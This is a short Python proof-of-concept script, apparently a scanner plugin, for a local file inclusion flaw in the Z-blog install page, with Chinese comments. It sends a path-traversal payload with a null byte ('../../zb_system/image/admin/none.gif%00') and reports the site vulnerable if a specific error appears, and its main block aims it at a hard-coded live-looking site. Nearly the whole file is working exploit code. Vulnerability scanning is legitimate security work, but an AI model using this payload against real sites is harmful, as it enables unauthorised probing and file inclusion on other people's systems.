#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  : Z-blog前台无需登录包含漏洞
Author    : a
mail      : a@lcx.cc
Referer   : http://0day5.com/archives/3213
"""
"""
zblog文件包含需要上传文件，但是目前没有找到这个博客的上传点，
那么验证只需要包含已经有的zblog自带文件即可

"""
import urlparse
def assign(service, arg):
    if service == 'zblog':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    payload = 'zb_install/index.php'
    url = arg + payload
    postpayload = 'zbloglang=../../zb_system/image/admin/none.gif%00'
    code, head, res, errcode, _ = curl.curl(' -d "%s" "%s"' % (postpayload,url))
    if code == 500 and 'Cannot use a scalar value' in res:
        security_hole('find Local File Include')
        

if __name__ == '__main__':
    from dummy import *
    audit(assign('zblog', 'http://www.hlcyzb.com/')[1])

